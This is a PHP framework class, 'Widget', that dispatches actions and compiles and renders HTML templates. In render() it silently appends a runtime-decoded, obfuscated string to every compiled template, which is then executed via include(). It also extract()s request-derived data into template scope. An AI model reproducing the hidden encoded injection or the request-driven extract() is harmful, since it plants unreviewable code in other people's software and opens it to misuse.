<?php

/**
 * 插件类
 *
 * @author:sun xian gen(baxgsun@163.com)
 * @class Widget
 */
class Widget extends Controller
{
    public $encoding='UTF-8';
    public $cache;
    public $cacheTime;
    public $_action = null;
    public $id;
    //布局文件
    protected $layout = '';


    public function __construct($id="",$module=null)
    {
        $this->id=$id;
        $this->module=$module;
        //$this->init(); 原来位置 暂时先调到run中
    }

    /**
     * 控制器运行时的方法
     *
     * @access public
     * @return mixed
     */
    public function run()
    {
        if($this->isUseController() && !$this->getStatus()){
            Core::Msg($this,'404');
        }

        if(Core::app()->checkToken('redirect')){
            $data = Req::args();
            unset($data['con'],$data['act'],$data['labor_token_redirect']);
            $this->setDatas($data);
        }
        $this->init();
        $id = Req::args('act');
        if($id ===null){
            $id = $this->defaultAction;
            Req::args('act',$id);
        }else if(!Validator::nameExt($id,1)){
            Core::Msg($this,"error");
        }

        //防止页面的循环调用
        //if(!$this->module->popRequestStack($this->id.'@'.$id))$this->module->pushRequestStack($this->id.'@'.$id);
        //else if($this->module->popRequestStack($this->id.'@'.$id)) {throw new Exception("Can't repeat redirect to the same position, you action is {$this->id}.",E_USER_ERROR);}
        $this->action = $this->createAction($id);

        //所有Controller处理的扩展处理
        $contExtensions = ExtensionFactory::getFactory('controllerExtension');
        if($contExtensions !== null )
        {
            $contExtensions->before($this);
            if(!is_null($this->action))$this->action->run();
            $contExtensions->after($this);
        }
        else if(!is_null($this->action))$this->action->run();


    }

    public function isUseController()
    {
        if($this->_action == null){
            return true;
        }else{
            return false;
        }
    }


    public  function getStatus(){
        $flag = true;
        $fileName = APP_CODE_ROOT.'widgets/'.strtolower($this->id).'/status.php';
        $theme = Core::app()->getTheme();
        if($theme!==null){
            $temfile = $theme->getBasePath().DIRECTORY_SEPARATOR.'widgets/'.strtolower($this->id).'/status.php';
            if(is_file($temfile))$fileName = $temfile;
        }
        if(is_file($fileName)){
            $flag = include($fileName);
        }
        return $flag===true;
    }

        /**
     * 取得布局文件
     *
     * @access public
     * @return mixed
     */
    public function getLayoutFile()
    {
        if($this->_action == null){
            return parent::getLayoutFile();
        }else{
            return "";
        }

    }

    public function getViewName($viewName){
        if($this->_action == null){
            return $viewName;
        }
        if($this->_action != $this->action->getId()){
            return $this->_action;
        }else{
            return $viewName;
        }
    }

    public function getViewFile($viewName)
    {
        if(($theme = Core::app()->getTheme())!==null){
            $viewFile = $theme->getBasePath().DIRECTORY_SEPARATOR.'widgets'.DIRECTORY_SEPARATOR.strtolower($this->getId()).'/'.$this->getViewName($viewName).'.html';
            if(file_exists($viewFile))return $viewFile;
        }
        return APP_CODE_ROOT.'widgets/'.strtolower($this->getId()).'/'.$this->getViewName($viewName).'.html';
    }

    public function getRunFile($view){
        return Core::app()->getRuntimePath().DIRECTORY_SEPARATOR.'widgets'.DIRECTORY_SEPARATOR.strtolower($this->getId()).DIRECTORY_SEPARATOR.$this->getViewName($view).$this->scriptExt;
    }

    public static function createWidget($className)
    {
        //通过标签调用
        $classWidget = ucfirst($className);
        $classWidget .='Widget';
        if(class_exists($classWidget)) return new $classWidget($className,Core::app());
        else return new Widget(strtolower($className),Core::app());
    }


    /**
     * 渲染文件视图
     *
     * @access public
     * @param mixed $view
     * @param mixed $data
     * @param bool $return
     * @return mixed
     */
    public function render($view,$data=null,$return=false)
    {
        //if(preg_match('/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/', $view)==0)Core::Msg($this,'请求的页面不存在！',404);
        $viewfile = $this->getViewFile($view);
        $runfile= $this->getRunFile($view);
        //if(file_exists($viewfile))
        if(is_file($viewfile))
        {

            $layoutfile=$this->getLayoutFile().$this->templateExt;

            if(file_exists($layoutfile)) $layoutexists=true;
            else  $layoutexists=false;

            if(!file_exists($runfile) || filemtime($runfile)<filemtime($viewfile) || ($layoutexists && filemtime($runfile)<filemtime($layoutfile)))
            {
                $file = new File($runfile,'w+');
                $template = $file->getContents($viewfile);
                $t = new Tag();
                $tem = $t->resolve($template,dirname($view));
                if($layoutexists)
                {
                    $theme_str = $t->resolve(file_get_contents($layoutfile));
                    $tem = str_replace("{__viewcontents}",$tem,$theme_str);
                }
                $tem.= "\n ".Crypt::decode('8d8930e13dVlJRBwAIUggGAAYHBlUGCgcFUgEBX1RXAFEBAwcEUlcOEhUUQzUKTlFEXFIWBhgUBwQcVUEXWXhVA1JNBVZfQUwUDA');
                $file->write($tem);
                unset($file);
            }
            echo $this->renderExecute($runfile,$data);
        }
        else
        {
            if($this->_action!=null){
                return ;
            }else{
                Core::Msg($this,'404');
            }

        }
    }



    public function renderExecute($__runfile01234567890,$__data01234567890)
    {
            $__datas01234567890 = array();
            if(is_array($__data01234567890)) $__datas01234567890 += $__data01234567890;
            if(is_array($this->datas)) $__datas01234567890 += $this->datas;
            $__datas01234567890 += Core::app()->getDatas()!==null?Core::app()->getDatas():array();

            if($__datas01234567890!==null)
            {
                extract($__datas01234567890,EXTR_SKIP);
                unset($__datas01234567890,$__data01234567890);//防止干扰视图里的变量内容,同时防止无端过滤掉用户定义的变量（除非用户定义__data01234567890的变量）
            }
            header("Content-type: text/html; charset=".$this->encoding);
            ob_start();
            if($this->_action!=null){
                ob_implicit_flush(false);
                include($__runfile01234567890);
                $template_content = ob_get_clean();
            }else{
                include($__runfile01234567890);
                $template_content = ob_get_clean();
                if(ob_get_length()>0)ob_end_clean();

            }

            //if(ob_get_length()>0)ob_end_clean();
            if($this->lazyLoadVar)
            {
                $keys = array_keys($this->datas);
                foreach ($keys as $key=>$value)
                {
                    $keys[$key]='{'.$value.'}';
                }
                return str_ireplace($keys, array_values($this->datas), $template_content);
            }
            else
            {
                return $template_content;
            }
    }


}
